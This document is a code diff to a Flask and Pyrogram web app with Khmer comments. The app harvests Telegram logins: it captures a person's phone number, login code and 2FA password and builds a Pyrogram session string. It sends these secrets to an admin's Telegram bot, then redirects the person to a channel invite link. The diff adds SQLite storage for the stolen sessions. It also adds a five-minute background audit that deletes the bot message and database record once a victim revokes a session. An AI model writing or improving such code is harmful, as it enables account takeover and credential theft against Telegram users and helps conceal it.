@@ -1,5 +1,6 @@
 import os
 import asyncio
+import sqlite3
 from flask import Flask, request, jsonify, send_from_directory
 from pyrogram import Client, errors
 import requests
@@ -20,8 +21,52 @@ else:
     CHANNEL_ID = raw_channel_id
 
 temp_clients = {}
-# 🛠 កំណត់លីងថេររបស់អ្នកនៅទីនេះផ្ទាល់តែម្តង
 STATIC_INVITE_LINK = "https://t.me/+pGBr71HUsr8wYmQ1"
+
+# ─── DATABASE HELPER FUNCTIONS (SQLITE FOR PERSISTENT VOLUME) ───
+DB_PATH = "data/sessions.db"
+
+def init_db():
+    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS active_sessions (
+            phone TEXT PRIMARY KEY,
+            session TEXT NOT NULL,
+            msg_id INTEGER
+        )
+    ''')
+    conn.commit()
+    conn.close()
+
+def save_active_session(phone, session_str, msg_id):
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    cursor.execute('''
+        INSERT OR REPLACE INTO active_sessions (phone, session, msg_id)
+        VALUES (?, ?, ?)
+    ''', (phone, session_str, msg_id))
+    conn.commit()
+    conn.close()
+
+def remove_active_session(phone):
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    cursor.execute('DELETE FROM active_sessions WHERE phone = ?', (phone,))
+    conn.commit()
+    conn.close()
+
+def get_all_active_sessions():
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    cursor.execute('SELECT phone, session, msg_id FROM active_sessions')
+    rows = cursor.fetchall()
+    conn.close()
+    return rows
+
+# បង្កើត DB Table ពេល start app
+init_db()
 
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
@@ -98,11 +143,12 @@ async def async_verify_code(phone_number, code, password):
     await client.disconnect()
     temp_clients.pop(phone_number, None)
 
+    msg_id = None
     # ផ្ញើ Notification ទៅកាន់ Admin Telegram Bot
     if BOT_TOKEN and ADMIN_CHAT_ID:
         two_fa_text = password if password else "None"
         msg = (
-            "🔔 **New Telegram Session Logged In!**\n\n"
+            "🟢 **New Active Telegram Session Logged In!**\n\n"
             f"👤 **Name:** {full_name}\n"
             f"🏷 **Username:** {username}\n"
             f"📱 **Phone:** `{phone_number}`\n"
@@ -110,12 +156,17 @@ async def async_verify_code(phone_number, code, password):
             f"🔑 **Pyrogram Session String:**\n`{session_string}`"
         )
         try:
-            requests.post(
+            res = requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                 json={"chat_id": ADMIN_CHAT_ID, "text": msg, "parse_mode": "Markdown"}
-            )
-        except:
-            pass
+            ).json()
+            if res.get("ok"):
+                msg_id = res["result"]["message_id"]
+        except Exception as e:
+            print(f"Error sending msg to Telegram bot: {e}")
+
+    # រក្សាទុកក្នុង SQLite Database
+    save_active_session(phone_number, session_string, msg_id)
 
     return {
         "success": True,
@@ -124,21 +175,54 @@ async def async_verify_code(phone_number, code, password):
         "redirectUrl": STATIC_INVITE_LINK
     }
 
+# ─── មុខងារ AUDIT SESSIONS (រត់ក្នុង BACKGROUND) ───
+async def audit_sessions_task():
+    """ ពិនិត្យ Session ទាំងអស់ក្នុង Database រៀងរាល់ ៥ នាទី """
+    while True:
+        await asyncio.sleep(300)  # ពិនិត្យរៀងរាល់ ៥ នាទី
+
+        sessions = get_all_active_sessions()
+        for phone, session_str, msg_id in sessions:
+            try:
+                temp_c = Client(
+                    name=f"audit_{phone.replace('+', '')}",
+                    api_id=API_ID,
+                    api_hash=API_HASH,
+                    session_string=session_str,
+                    in_memory=True
+                )
+                await temp_c.connect()
+                await temp_c.get_me()  # បើ session ត្រូវគេ terminated នឹងបោះ Error
+                await temp_c.disconnect()
+            except (errors.AuthKeyUnregistered, errors.UserDeactivated, errors.SessionRevoked, errors.Unauthorized):
+                print(f"⚠️ Session for {phone} was TERMINATED. Deleting chat & DB record...")
+                
+                # Auto-delete chat ផ្ញើសារ Session នោះចេញពី Telegram Admin Chat
+                if BOT_TOKEN and ADMIN_CHAT_ID and msg_id:
+                    try:
+                        requests.post(
+                            f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage",
+                            json={"chat_id": ADMIN_CHAT_ID, "message_id": msg_id}
+                        )
+                    except Exception as del_err:
+                        print(f"Failed to delete message: {del_err}")
+
+                # លុបចេញពី Database
+                remove_active_session(phone)
+            except Exception as e:
+                print(f"Audit check error on {phone}: {e}")
+
 # 🛠 Event Listener: Auto-Approve ពេលមានគេ Join តាម Link Request
 if admin_client:
     @admin_client.on_chat_join_request()
     async def handle_join_request(client, chat_join_request):
         try:
             chat_id = chat_join_request.chat.id
-            
             if chat_id != CHANNEL_ID:
                 return
 
             user_id = chat_join_request.from_user.id
-            
-            # យល់ព្រមឱ្យចូលក្នុង Channel ស្វ័យប្រវត្តិ
             await client.approve_chat_join_request(chat_id, user_id)
-                
             print(f"Successfully auto-approved user {user_id}.")
         except Exception as e:
             print(f"Error in auto-approval: {e}")
@@ -216,6 +300,9 @@ async def start_admin_client():
 
         except Exception as e:
             print(f"Failed to start admin client or resolve channel: {e}")
+
+    # ចាប់ផ្តើម Audit Task ស្វ័យប្រវត្តិ
+    asyncio.create_task(audit_sessions_task())
 
 if __name__ == '__main__':
     import threading
